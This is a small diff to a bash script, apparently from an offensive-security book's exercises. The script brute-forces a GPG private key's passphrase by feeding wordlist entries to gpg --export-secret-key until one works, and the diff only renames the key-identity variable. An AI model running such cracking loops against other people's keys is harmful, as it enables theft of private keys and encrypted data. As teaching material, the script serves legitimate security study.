@@ -1,5 +1,5 @@
 #!/bin/bash
-IDENTITY=some_identity@email.local
+KEY_ID="identity@blackhatbash.com"
 
 while read -r passphrase; do
   echo "Brute forcing with ${passphrase}..."
@@ -9,7 +9,7 @@ while read -r passphrase; do
                              --passphrase-fd 0 \
                              --output private.pgp \
                              --armor \
-                             --export-secret-key "${IDENTITY}"
+                             --export-secret-key "${KEY_ID}"
 
   if [[ $? -eq 0 ]]; then
     echo "Passphrase is: ${passphrase}"
